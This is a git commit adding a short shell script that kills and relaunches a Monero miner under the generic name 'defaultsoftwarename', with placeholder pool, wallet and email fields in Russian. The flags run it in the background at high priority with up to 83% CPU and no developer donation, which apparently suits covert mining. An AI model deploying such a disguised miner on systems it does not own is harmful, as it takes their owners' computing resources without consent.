b0722f533b093d477e2b8937aff76cc0b4fdb02e
whatislove0 <58768273+whatislove0@users.noreply.github.com>
2019-12-12 23:53:14 +0200

    Add files via upload

---
+++ 3.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
